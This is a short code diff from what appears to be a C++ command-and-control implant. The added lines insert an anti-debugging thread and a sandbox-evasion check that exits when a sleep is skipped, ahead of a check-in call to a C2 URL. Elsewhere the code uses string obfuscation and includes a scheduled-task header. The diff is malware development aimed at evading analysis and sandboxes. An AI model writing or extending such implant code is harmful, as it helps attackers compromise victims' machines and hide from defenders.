@@ -21,6 +21,7 @@
 #include "utils.h"
 #include "handlers.h"
 #include "schtask.h"
+#include "antidebug.h"
 
 using namespace std;
 using namespace andrivet::ADVobfuscator;
@@ -35,6 +36,7 @@ int main()
 	}
 
 	// Anti Debug
+	StartAntiDebugThread();
 
 	// Anti Sandbox
 
@@ -71,7 +73,11 @@ int main()
 	{
 		float sleeptime = currentProfile->sleep + (currentProfile->sleep * currentProfile->jitter);
 		// Sleep(currentProfile->sleep * 1000);
-		Sleep(5000);
+		if(DetectSleepSkip(5000))
+		{
+			DEBUG_PRINTF("Sleep skipped, exiting\n");
+			exit(1);
+		}
 		Task *newTask = Checkin(C2_URL, currentProfile);
 		if (newTask == NULL)
 		{
